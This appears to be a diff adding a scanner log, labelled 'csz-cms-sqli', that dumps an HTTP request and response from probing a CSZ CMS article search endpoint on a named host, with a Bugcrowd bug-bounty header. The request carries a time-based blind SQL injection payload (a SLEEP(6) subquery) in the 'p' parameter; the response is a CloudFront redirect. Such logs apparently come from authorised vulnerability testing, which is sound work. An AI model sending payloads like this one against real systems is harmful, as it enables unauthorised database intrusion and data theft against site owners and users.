@@ -1,0 +1,24 @@
+[csz-cms-sqli] Dumped HTTP request for https://techsolutions.bitpanda.com/csz-cms/plugin/article/search?p=3D1%27%22)%20AND%20(SELECT%203910%20FROM%20(SELECT(SLEEP(6)))qIap)--%20ogLS
+
+
+GET /csz-cms/plugin/article/search?p=3D1%27%22)%20AND%20(SELECT%203910%20FROM%20(SELECT(SLEEP(6)))qIap)--%20ogLS HTTP/1.1
+Host: techsolutions.bitpanda.com
+User-Agent: Mozilla/5.0 (Knoppix; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Connection: close
+X-Bug-Bounty: Bugcrowd-eno@bugcrowdninja.com
+Accept-Encoding: gzip
+
+
+[csz-cms-sqli] Dumped HTTP response https://techsolutions.bitpanda.com/csz-cms/plugin/article/search?p=3D1%27%22)%20AND%20(SELECT%203910%20FROM%20(SELECT(SLEEP(6)))qIap)--%20ogLS
+
+HTTP/1.1 301 Moved Permanently
+Connection: close
+Date: Tue, 05 Aug 2025 12:53:24 GMT
+Location: ./search/?p=3D1%27%22)%20AND%20(SELECT%203910%20FROM%20(SELECT(SLEEP(6)))qIap)--%20ogLS
+Via: 1.1 018bc8ac3ac3155b3d0b36b861811052.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: 1M0e1WXTlXoDO2gIzjRZt4tNhOFzOQtMd_tcRmEFhvfXf18fPdmd0w==
+X-Amz-Cf-Pop: IAD55-P8
+X-Cache: LambdaGeneratedResponse from cloudfront
+Content-Length: 0
+
+
